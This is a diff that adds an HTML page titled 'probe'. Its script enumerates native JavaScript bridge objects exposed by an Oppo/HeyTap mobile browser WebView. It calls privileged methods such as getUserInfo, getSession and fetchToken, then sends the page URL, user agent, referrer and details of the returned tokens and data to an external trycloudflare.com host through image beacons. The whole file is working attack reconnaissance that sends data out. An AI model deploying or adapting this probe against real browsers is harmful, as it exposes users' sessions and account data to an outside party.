@@ -1,0 +1,31 @@
+<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>probe</title><body style="font:16px system-ui">PROBE LOADED<script>
+(function(){
+ var B='https://plates-michelle-seas-wanted.trycloudflare.com';
+ function rep(tag,val){try{var s=String(val).slice(0,260);new Image().src=B+'/report?p=probe-'+encodeURIComponent(tag)+'&d='+encodeURIComponent(s);}catch(e){}}
+ function sum(r){
+  if(r===null||r===undefined) return String(r);
+  if(typeof r==='object'){
+   var out='keys='+Object.keys(r).slice(0,25).join(',');
+   if(r.code!==undefined) out+=' code='+r.code;
+   if(typeof r.data==='string') out+=' data.len='+r.data.length+' data8='+r.data.slice(0,8);
+   else if(r.data!==undefined) out+=' data.type='+typeof r.data;
+   if(typeof r.token==='string') out+=' token.len='+r.token.length;
+   if(r.uid!==undefined) out+=' uid.len='+String(r.uid).length;
+   return out;
+  }
+  return String(r).slice(0,200);
+ }
+ rep('href',location.href); rep('ua',navigator.userAgent); rep('ref',document.referrer);
+ ['wv','OppoFlow','BrowserBridge','OppoWebPage','HeytapClientReader','BrowserPriv','oppoErrorPage','oppoUrlQuery','OppoInstantWebPage','oppoDownload','Comment'].forEach(function(n){
+  try{var o=window[n]; if(!o){rep('obj-'+n,'absent');return;} var names=[]; try{names=Object.getOwnPropertyNames(Object.getPrototypeOf(o)||{}).slice(0,40);}catch(e){} rep('obj-'+n,'type='+(typeof o)+' names='+names.join(','));}catch(e){rep('obj-'+n,'EX '+String(e).slice(0,80));}
+ });
+ function call(n,m,args){try{var o=window[n]; if(!o||typeof o[m]!=='function'){rep('call-'+n+'.'+m,'NOFN');return;} var r=o[m].apply(o,args||[]); rep('call-'+n+'.'+m,sum(r));}catch(e){rep('call-'+n+'.'+m,'EX '+String(e).slice(0,120));}}
+ call('wv','isMethodValid',['Comment.addCommentReplyToDB']);
+ call('wv','isMethodValid',['Comment.getAllCommentReplyFromDB']);
+ call('wv','getKKUAV3',[]); call('wv','getKKUA',[]);
+ call('OppoFlow','getUserInfo',[]);
+ call('BrowserPriv','getUserInfo',[]); call('BrowserPriv','getSession',[]); call('BrowserPriv','fetchToken',[]);
+ rep('done','1');
+})();
+</script></body>
